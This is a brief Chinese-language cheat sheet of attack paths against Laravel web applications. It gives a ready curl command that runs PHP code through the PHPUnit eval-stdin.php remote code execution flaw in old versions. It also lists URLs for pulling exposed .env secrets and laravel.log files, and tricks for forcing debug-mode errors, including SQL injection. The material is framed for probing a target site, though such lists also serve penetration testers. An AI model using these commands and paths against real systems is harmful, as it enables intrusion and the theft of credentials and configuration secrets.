＃laravel框架中的常见错误
1. Laravel PHPUnit远程代码执行
* 完整路径利用：http://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
* 受影响的版本：4.8.28之前的版本和5.6.3之前的5.x

命令
```
curl -d“ <？php echo php_uname（）;？>” http://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

2.暴露的环境变量 
* 完整路径利用：http://target.com/.env


3.公开的日志文件
* 完整路径利用：http://target.com/storage/logs/laravel.log

4.启用Laravel调试模式
* 在GET或POST方法中使用SQL注入查询
* 尝试路径/登出（例如：target.com/登出）
* 在参数中使用[]（例如：target.com/param [] = 0）


